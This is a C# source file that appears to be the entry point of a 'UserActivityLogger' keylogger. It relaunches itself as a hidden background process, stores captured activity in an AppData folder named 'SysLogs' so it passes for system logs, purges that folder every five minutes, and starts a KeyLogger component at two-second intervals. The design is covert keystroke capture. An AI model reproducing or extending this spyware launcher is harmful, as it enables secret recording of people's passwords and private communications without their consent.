using Core;
using System;
using System.Configuration;
using System.Diagnostics;
using System.IO;
using System.Linq;
using UserActivityLogger;

namespace Host
{
    class Program
    {
        static string _logFolder;
        static void Main(string[] args)
        {
            if (SingleInstance.IsApplicationAlreadyRunning("UserActivityLoggerHost"))
            {
                return;
            }

            if (args.Length > 0 && args[0] == "hidden")
            {
                _logFolder = Path.Combine(GetRootFolderPath(), "SysLogs");

                new UnhandledExceptionHandlercs().Register(ErrrorLogger.LogError);

                new LogFolderPurger().StartPurging(_logFolder, TimeSpan.FromMinutes(5));

                var activityLogger = new ActivityLogger(TimeSpan.FromSeconds(2), _logFolder, new KeyLogger());

                activityLogger.StartLoging();
            }
            else
            {
                ProcessHelper.RunAsBackGround(System.Reflection.Assembly.GetEntryAssembly().Location);
            }
        }
        static string GetRootFolderPath()
        {
            try
            {
                if (ConfigurationManager.AppSettings["DemoFolder"] != null)
                {
                    var rootFolder = ConfigurationManager.AppSettings["DemoFolder"].Trim();
                    if (!string.IsNullOrEmpty(rootFolder))
                    {
                        if (!Directory.Exists(rootFolder))
                        {
                            Directory.CreateDirectory(rootFolder);
                        }

                        return rootFolder;
                    }
                }
            }
            catch (Exception ex)
            {

            }

            return Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
        }

    }
}
